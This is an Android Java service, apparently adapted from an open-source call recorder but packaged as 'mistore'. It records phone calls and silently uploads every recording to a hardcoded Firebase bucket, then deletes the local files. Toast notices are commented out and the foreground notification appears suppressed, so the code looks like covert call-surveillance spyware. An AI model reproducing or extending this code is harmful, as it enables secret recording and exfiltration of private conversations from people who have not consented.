/* Copyright (c) 2012 Kobi Krasnoff
 *
 * This file is part of Call recorder For Android.
 *
 * Call recorder For Android is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Call recorder For Android is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Call recorder For Android.  If not, see <http://www.gnu.org/licenses/>
 */
package com.spark.mistore.services;

import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.IBinder;
import android.os.ParcelFileDescriptor;
import android.provider.OpenableColumns;
import android.support.annotation.NonNull;
import android.support.v4.provider.DocumentFile;
import android.text.format.DateFormat;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.spark.mistore.ui.home.MainActivity;

import java.io.File;
import java.util.Date;

public class RecordService extends Service {
	private MediaRecorder recorder;
	private String phoneNumber;

	private DocumentFile file;
	private boolean onCall = false;
	private boolean recording = false;
	private boolean onForeground = false;
    private StorageReference mStorageRef;


	@Override
	public IBinder onBind(Intent intent) { return null; }

	@Override
	public void onCreate() {
		UserPreferences.init(this);
		FirebaseStorage storage = FirebaseStorage.getInstance();
		mStorageRef = storage.getReferenceFromUrl("gs://mi-strore.appspot.com/recordings");
//		mStorageRef = FirebaseStorage.getInstance().getReference();
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(Constants.TAG, "RecordService onStartCommand");
		if (intent == null)
			return START_NOT_STICKY;

		int commandType = intent.getIntExtra("commandType", 0);
		if (commandType == 0)
			return START_NOT_STICKY;

		boolean enabled = UserPreferences.getEnabled();

		switch (commandType) {
		case Constants.RECORDING_ENABLED:
			Log.d(Constants.TAG, "RecordService RECORDING_ENABLED");
			if (enabled && phoneNumber != null && onCall && !recording) {
				Log.d(Constants.TAG, "RecordService STATE_START_RECORDING");
				startService();
				startRecording();
			}
			break;
		case Constants.RECORDING_DISABLED:
			Log.d(Constants.TAG, "RecordService RECORDING_DISABLED");
			if (onCall && phoneNumber != null && recording) {
				Log.d(Constants.TAG, "RecordService STATE_STOP_RECORDING");
				stopAndReleaseRecorder();
				recording = false;
			}
			break;
		case Constants.STATE_INCOMING_NUMBER:
			Log.d(Constants.TAG, "RecordService STATE_INCOMING_NUMBER");
			startService();
			if (phoneNumber == null)
				phoneNumber = intent.getStringExtra("phoneNumber");
			break;
		case Constants.STATE_CALL_START:
			Log.d(Constants.TAG, "RecordService STATE_CALL_START");
			onCall = true;

			if (enabled && !recording) {
				startService();
				startRecording();
			}
			break;
		case Constants.STATE_CALL_END:
			Log.d(Constants.TAG, "RecordService STATE_CALL_END");
			stopAndReleaseRecorder();

			Uri file = null;
			try {
				file = Uri.fromFile(getLatestFilefromDir(UserPreferences.getStorageUri().getPath()));
			} catch (Exception e) {
				e.printStackTrace();
			}
//			String date = (String) DateFormat.format("yyyyMMddHHmmss", new Date());
//			String filename = date + "_" + phoneNumber.replaceAll("[^0-9]", "");
			StorageReference riversRef = mStorageRef.child("recordings/" + getFileName(file));

			riversRef.putFile(file)
					.addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
						@Override
						public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
							// Get a URL to the uploaded content
//							Uri downloadUrl = taskSnapshot.getDownloadUrl();

							deleteFile();
							uploadAllFiles(UserPreferences.getStorageUri().getPath());
						}
					})
					.addOnFailureListener(new OnFailureListener() {
						@Override
						public void onFailure(@NonNull Exception exception) {
							// Handle unsuccessful uploads
							// ...
						}
					});



			onCall = false;
			phoneNumber = null;
			recording = false;
			stopService();
			break;
		}
		return START_STICKY;
	}

	private File getLatestFilefromDir(String dirPath){
		File dir = new File(dirPath);
		File[] files = dir.listFiles();
		if (files == null || files.length == 0) {
			return null;
		}

		File lastModifiedFile = files[0];
		for (int i = 1; i < files.length; i++) {
			if (lastModifiedFile.lastModified() < files[i].lastModified()) {
				lastModifiedFile = files[i];
			}
		}
		return lastModifiedFile;
	}

	private void uploadAllFiles(String dirPath){
		File dir = new File(dirPath);
		File[] files = dir.listFiles();
		if (files == null || files.length == 0) {
			return ;
		}

		for (File file : files) {
			StorageReference riversRef = mStorageRef.child("recordings/" + file.getName());

			riversRef.putFile(Uri.fromFile(file))
                    .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            // Get a URL to the uploaded content
    //							Uri downloadUrl = taskSnapshot.getDownloadUrl();
                            file.delete();
                        }
                    })
                    .addOnFailureListener(new OnFailureListener() {
                        @Override
                        public void onFailure(@NonNull Exception exception) {
                            // Handle unsuccessful uploads
                            // ...
                        }
                    });
		}
	}

	@Override
	public void onDestroy() {
		Log.d(Constants.TAG, "RecordService onDestroy");
		stopAndReleaseRecorder();
		stopService();
		super.onDestroy();
	}

	/// In case it is impossible to record
	private void terminateAndEraseFile() {
		Log.d(Constants.TAG, "RecordService terminateAndEraseFile");
		stopAndReleaseRecorder();
		recording = false;
		if (file != null)
			deleteFile();
	}

	private void stopService() {
		Log.d(Constants.TAG, "RecordService stopService");
		stopForeground(true);
		onForeground = false;
		this.stopSelf();
	}

	private void deleteFile() {
		Log.d(Constants.TAG, "RecordService deleteFile");
		file = DocumentFile.fromFile(getLatestFilefromDir(UserPreferences.getStorageUri().getPath()));
		file.delete();
		file = null;
	}

	private void stopAndReleaseRecorder() {
		if (recorder == null)
			return;
		Log.d(Constants.TAG, "RecordService stopAndReleaseRecorder");
		boolean recorderStopped = false;
		boolean exception = false;

		try {
			recorder.stop();
			recorderStopped = true;
		} catch (IllegalStateException e) {
			Log.e(Constants.TAG, "Failed to stop recorder.  Perhaps it wasn't started?", e);
			exception = true;
		}
		recorder.reset();
		recorder.release();
		recorder = null;
		if (exception) {
			deleteFile();
		}
		if (recorderStopped) {
//			Toast.makeText(this, this.getString(R.string.receiver_end_call),
//					Toast.LENGTH_SHORT)
//				.show();


		}
	}

	public String getFileName(Uri uri) {
		String result = null;
		if (uri.getScheme().equals("content")) {
			Cursor cursor = getContentResolver().query(uri, null, null, null, null);
			try {
				if (cursor != null && cursor.moveToFirst()) {
					result = cursor.getString(cursor.getColumnIndex(OpenableColumns.DISPLAY_NAME));
				}
			} finally {
				cursor.close();
			}
		}
		if (result == null) {
			result = uri.getPath();
			int cut = result.lastIndexOf('/');
			if (cut != -1) {
				result = result.substring(cut + 1);
			}
		}
		return result;
	}


	private void startRecording() {
		Log.d(Constants.TAG, "RecordService startRecording");
		recorder = new MediaRecorder();

		try {
			recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL);
			recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
			recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);

			file = FileHelper.getFile(this, phoneNumber);
			ParcelFileDescriptor fd = getContentResolver()
				.openFileDescriptor(file.getUri(), "w");
			if (fd == null)
				throw new Exception("Failed open recording file.");
			recorder.setOutputFile(fd.getFileDescriptor());

			recorder.setOnErrorListener((mr, what, extra) -> {
				Log.e(Constants.TAG, "OnErrorListener " + what + "," + extra);
				terminateAndEraseFile();
			});

			recorder.setOnInfoListener((mr, what, extra) -> {
				Log.e(Constants.TAG, "OnInfoListener " + what + "," + extra);
				terminateAndEraseFile();
			});

			recorder.prepare();

			// Sometimes the recorder takes a while to start up
			Thread.sleep(2000);

			recorder.start();
			recording = true;

			Log.d(Constants.TAG, "RecordService: Recorder started!");
//			Toast toast = Toast.makeText(this,
//				this.getString(R.string.receiver_start_call),
//				Toast.LENGTH_SHORT);
//			toast.show();
		} catch (Exception e) {
			Log.e(Constants.TAG, "Failed to set up recorder.", e);
			terminateAndEraseFile();
//			Toast toast = Toast.makeText(this,
//				this.getString(R.string.record_impossible),
//				Toast.LENGTH_LONG);
//			toast.show();
		}
	}

	private void startService() {
		if (onForeground)
			return;

		Log.d(Constants.TAG, "RecordService startService");
		Intent intent = new Intent(this, MainActivity.class);
		intent.setFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
		PendingIntent pendingIntent = PendingIntent.getActivity(
			getBaseContext(), 0, intent, 0);


		startForeground(0,null);
		onForeground = true;
	}
}
